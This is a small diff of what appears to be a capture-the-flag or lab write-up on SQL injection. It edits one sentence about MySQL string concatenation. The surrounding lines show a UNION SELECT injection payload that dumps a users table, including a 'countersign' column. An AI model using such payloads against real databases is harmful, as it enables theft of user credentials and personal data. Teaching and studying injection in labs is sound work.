@@ -14,7 +14,7 @@ We can conclude that we have access to two columns of output, let's try getting 
 ```
 We can see that the `users` table contains several informations about them, such as `user_id` `first_name` `last_name` `town` `country` `planet` `Commentaire` and `countersign`
 
-MySQL uses the `CONCAT_WS` function to concacenate multiple strings with a separator
+MySQL uses the `CONCAT` function to concacenate multiple strings
 ```SQL
 1=1 UNION SELECT NULL, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
 ```
